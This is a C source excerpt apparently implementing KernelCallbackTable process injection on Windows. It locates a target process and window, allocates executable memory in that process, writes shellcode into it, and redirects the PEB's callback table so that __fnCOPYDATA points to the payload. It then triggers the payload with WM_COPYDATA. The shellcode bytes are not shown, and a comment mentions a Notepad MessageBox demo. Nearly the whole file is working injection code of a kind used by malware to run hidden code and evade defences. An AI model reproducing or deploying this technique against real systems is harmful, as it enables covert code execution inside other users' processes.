DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed: 0x%lX\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                printf("[+] Found '%ls' with PID: %lu\n", processName, pid);
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return pid;
}

typedef struct _ENUM_PARAM {
    DWORD dwProcessId;
    HWND  hWindow;
} ENUM_PARAM, * PENUM_PARAM;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    PENUM_PARAM pParam = (PENUM_PARAM)lParam;
    DWORD processId = 0;

    GetWindowThreadProcessId(hwnd, &processId);

    if (processId == pParam->dwProcessId && IsWindowVisible(hwnd)) {
        wchar_t title[256] = { 0 };
        GetWindowTextW(hwnd, title, 256);
        if (wcslen(title) > 0) {
            pParam->hWindow = hwnd;
            printf("[+] Found target window: 0x%p (Title: %ls)\n", hwnd, title);
            return FALSE;
        }
    }

    return TRUE;
}

BOOL KernelCallbackTableInject(HWND hTargetWindow, DWORD targetPid) {
    BOOL returnStatus = FALSE;
    NTSTATUS status = 0;

    HMODULE hNtdll = NULL;
    pfnNtQueryInformationProcess pNtQueryInformationProcess = NULL;
    HANDLE hTargetProcess = NULL;

    LPBYTE pRemoteShellcode = NULL;
    LPBYTE pFakeKct = NULL;

    WCHAR triggerMessage[] = L"TRIGGER_PAYLOAD";

    do {
        hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) BREAK_WITH_ERROR("Failed to get ntdll.dll handle");

        pNtQueryInformationProcess = (pfnNtQueryInformationProcess)
            GetProcAddress(hNtdll, "NtQueryInformationProcess");
        if (!pNtQueryInformationProcess)
            BREAK_WITH_ERROR("Failed to get NtQueryInformationProcess");

        printf("[+] Got NtQueryInformationProcess at: 0x%p\n", pNtQueryInformationProcess);

        hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hTargetProcess) BREAK_WITH_ERROR("Failed to open target process (try run as Admin!)");

        printf("[+] Opened target process (PID: %lu, Handle: 0x%p)\n",
            targetPid, hTargetProcess);

        PROCESS_BASIC_INFORMATION pbi = { 0 };
        status = pNtQueryInformationProcess(
            hTargetProcess,
            0,
            &pbi,
            sizeof(pbi),
            NULL
        );
        if (!NT_SUCCESS(status)) BREAK_WITH_STATUS("NtQueryInformationProcess failed", status);

        printf("[+] PEB base address (in target): 0x%p\n", pbi.PebBaseAddress);

        MY_PEB peb = { 0 };
        if (!ReadProcessMemory(hTargetProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL))
            BREAK_WITH_ERROR("Failed to read target PEB");

        printf("[+] KernelCallbackTable pointer (original): 0x%p\n", peb.KernelCallbackTable);

        KERNELCALLBACKTABLE kct = { 0 };
        if (!ReadProcessMemory(hTargetProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL))
            BREAK_WITH_ERROR("Failed to read KernelCallbackTable");

        printf("[+] Original __fnCOPYDATA handler: 0x%p\n", (PVOID)kct.__fnCOPYDATA);

        pRemoteShellcode = (LPBYTE)VirtualAllocEx(
            hTargetProcess,
            NULL,
            sizeof(shellcode),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        if (!pRemoteShellcode) BREAK_WITH_ERROR("VirtualAllocEx shellcode failed");

        if (!WriteProcessMemory(hTargetProcess, pRemoteShellcode, shellcode, sizeof(shellcode), NULL))
            BREAK_WITH_ERROR("WriteProcessMemory shellcode failed");

        printf("[+] Shellcode injected at: 0x%p (size: %zu bytes)\n",
            pRemoteShellcode, sizeof(shellcode));

        kct.__fnCOPYDATA = (ULONG_PTR)pRemoteShellcode;
        printf("[+] Replaced __fnCOPYDATA with shellcode address: 0x%p\n", pRemoteShellcode);

        pFakeKct = (LPBYTE)VirtualAllocEx(
            hTargetProcess,
            NULL,
            sizeof(kct),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
        );
        if (!pFakeKct) BREAK_WITH_ERROR("VirtualAllocEx fake KCT failed");

        if (!WriteProcessMemory(hTargetProcess, pFakeKct, &kct, sizeof(kct), NULL))
            BREAK_WITH_ERROR("WriteProcessMemory fake KCT failed");

        printf("[+] Fake KCT written at: 0x%p\n", pFakeKct);

        PVOID pPebKctField = (PVOID)(
            (PBYTE)pbi.PebBaseAddress + offsetof(MY_PEB, KernelCallbackTable)
            );

        if (!WriteProcessMemory(hTargetProcess, pPebKctField, &pFakeKct, sizeof(PVOID), NULL))
            BREAK_WITH_ERROR("Failed to update PEB -> KernelCallbackTable");

        printf("[+] PEB.KernelCallbackTable updated to: 0x%p\n", pFakeKct);

        printf("[*] Sending WM_COPYDATA to trigger shellcode...\n");

        COPYDATASTRUCT cds = { 0 };
        cds.dwData = 0x1337;
        cds.cbData = (lstrlenW(triggerMessage) + 1) * sizeof(WCHAR);
        cds.lpData = triggerMessage;

        DWORD_PTR sendResult = 0;
        LRESULT sendRet = SendMessageTimeoutW(
            hTargetWindow,
            WM_COPYDATA,
            (WPARAM)hTargetWindow,
            (LPARAM)&cds,
            SMTO_ABORTIFHUNG,
            5000,
            &sendResult
        );

        printf("[+] WM_COPYDATA sent! Return: %lld | Result: %llu\n", sendRet, sendResult);
        printf("[*] If MessageBox appeared in Notepad, injection succeeded!\n");

        Sleep(500);

        if (!WriteProcessMemory(hTargetProcess, pPebKctField,
            &peb.KernelCallbackTable, sizeof(PVOID), NULL))
            BREAK_WITH_ERROR("Failed to restore original KCT");

        printf("[+] Original KCT restored successfully.\n");
        returnStatus = TRUE;

    } while (0);

    if (pRemoteShellcode) VirtualFreeEx(hTargetProcess, pRemoteShellcode, 0, MEM_RELEASE);
    if (pFakeKct)         VirtualFreeEx(hTargetProcess, pFakeKct, 0, MEM_RELEASE);
    if (hTargetProcess)   CloseHandle(hTargetProcess);

    return returnStatus;
}

